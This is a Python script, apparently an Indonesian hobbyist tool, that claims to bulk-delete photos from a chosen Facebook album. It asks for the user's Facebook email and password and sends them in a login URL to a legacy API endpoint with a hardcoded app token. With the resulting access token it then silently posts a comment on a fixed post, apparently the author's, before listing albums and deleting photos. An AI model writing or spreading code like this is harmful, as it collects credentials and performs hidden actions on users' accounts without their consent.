import os, sys, requests
from getpass import getpass
r = requests.Session()
P = '\x1b[1;97m'
H = '\x1b[1;92m'

class utama:

    def __init__(self):
        self.id = []
        self.berhasil = []
        self.gagal = []
        self.a = 'https://graph.facebook.com/'
        self.t = 'https://api.facebook.com/restserver.php'
        self.headers = {'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
        self.token()
        exit(('\n%s[*] Hanya bisa menghapus %s foto jika ingin menghapus lagi silahkan ulangi lagi:)' % (P, len(self.berhasil))))

    def token(self):
        os.system('clear')
        print(('%s\n╦ ╦┌─┐┌─┐┬ ┬┌─┐  ╔═╗┌─┐┌┬┐┌─┐\n╠═╣├─┤├─┘│ │└─┐  ╠╣ │ │ │ │ │\n╩ ╩┴ ┴┴  └─┘└─┘  ╚  └─┘ ┴ └─┘%s\nAuthor : oOkem\nBlog   : https://bapakpedia.blogspot.com/\n\t\t' % (H, P)))
        print(('%s----------------------------------------' % P))
        em = input(('%s[*] Email : ' % P))
        pas = getpass(('%s[*] Pass  : ' % P))
        print(('%s----------------------------------------' % P))
        data = r.get(('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + em + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'), headers=(self.headers)).json()
        try:
            self.token = data['access_token']
        except:
            exit(('%s[*] Login gagal:)' % P))

        r.post('{}{}/comments?message={}&access_token={}'.format(self.a, '100005584243934_1148185588710905', 'Tq❤️', self.token))
        b = r.get('{}me?access_token={}'.format(self.a, self.token)).json()['name']
        print(('%s[*] Nama : %s' % (P, b)))
        print(('\n\n%s[ Albums Anda ]' % P))
        for y in r.get('{}v2.3/me/albums?access_token={}'.format(self.a, self.token)).json()['data']:
            print(('%s----------------------------------------' % P))
            print(('%s[*] Nama : %s' % (P, y['name'])))
            print(('%s[*] ID   : %s' % (P, y['id'])))
            print(('%s----------------------------------------' % P))

        t = input(('%s[*] Masukan id albums : ' % P))
        for u in r.get('{}{}/photos?access_token={}'.format(self.a, t, self.token)).json()['data']:
            self.id.append(u['id'])

        print(('%s[*] Start ...' % P))
        try:
            for z in r.get('{}{}/photos?access_token={}'.format(self.a, t, self.token)).json()['data']:
                ya = r.post('{}{}?method=DELETE&access_token={}'.format(self.a, z['id'], self.token)).json()
                try:
                    asu = ya['error']['message']
                    self.gagal.append(z['id'])
                except TypeError:
                    self.berhasil.append(z['id'])

                (
                 print(('\r%s[%s] Menghapus %s/%s ' % (
                  P, len(self.gagal), len(self.berhasil),
                  len(self.id))),
                   end=''),)
                sys.stdout.flush()

        except KeyError:
            exit(('%s[*] Error:)' % P))


utama()
